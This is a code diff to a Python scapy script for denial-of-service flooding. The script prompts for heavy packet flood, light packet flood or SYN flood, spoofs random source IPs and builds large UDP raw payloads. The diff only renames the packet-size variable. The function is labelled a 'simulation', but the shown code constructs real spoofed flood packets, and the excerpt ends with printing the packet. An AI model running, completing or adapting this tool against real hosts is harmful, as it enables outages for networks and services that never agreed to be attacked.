@@ -10,15 +10,15 @@ attack_type = input(
     "1. Heavy packet flood \n2. Light packet flood \n3. SYN flood \nAttack Type (default 1):"
 )
 
-pkg_size = 0
+pkt_size = 0
 if not (attack_type == "2") and not (attack_type == "3"):
-    pkg_size = input("Packet Size (blank for max): ")
+    pkt_size = input("Packet Size (blank for max): ")
 
-if not (pkg_size):
-    pkg_size = random.randint(MAX_PORT - 10000, MAX_PORT - 535)
+if not (pkt_size):
+    pkt_size = random.randint(MAX_PORT - 10000, MAX_PORT - 535)
 
 
-def dos_simulation(ip_src, ip_dst, pkg_size):
+def dos_simulation(ip_src, ip_dst, pkt_size):
 
     ip_layer = scp.IP(src=scp.RandIP(), dst=ip_dst)
 
@@ -26,7 +26,7 @@ def dos_simulation(ip_src, ip_dst, pkg_size):
         ip_layer.src = ip_src
 
     udp_layer = scp.UDP(sport=80, dport=21)
-    raw_layer = scp.Raw(int(pkg_size))
+    raw_layer = scp.Raw(int(pkt_size))
 
     packet = ip_layer / udp_layer / raw_layer
     if attack_type == "2":
@@ -42,4 +42,4 @@ def dos_simulation(ip_src, ip_dst, pkg_size):
     print(packet)
 
 
-dos_simulation(ip_src, ip_dst, pkg_size)
+dos_simulation(ip_src, ip_dst, pkt_size)
